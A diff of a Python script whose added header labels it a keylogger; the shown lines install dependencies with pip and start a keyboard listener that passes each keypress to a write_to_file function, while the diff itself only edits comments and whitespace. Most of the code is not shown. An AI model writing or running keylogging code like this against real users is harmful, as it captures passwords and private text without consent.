@@ -1,11 +1,14 @@
+# Keylogger
+#=========================================================
 # Copyright (c) 2025 [Soumit Santra]. All rights reserved.
+#=========================================================
 
 import sys
 import subprocess
 import os
 
 def install_dependencies():
-    #    Install required packages
+    # Install required packages
     try:
         # First ensure pip and setuptools are available
         subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip', 'setuptools'])
@@ -312,3 +315,4 @@ def write_to_file(key):
 # Start the listener
 with Listener(on_press=write_to_file) as listener:
     listener.join()
+
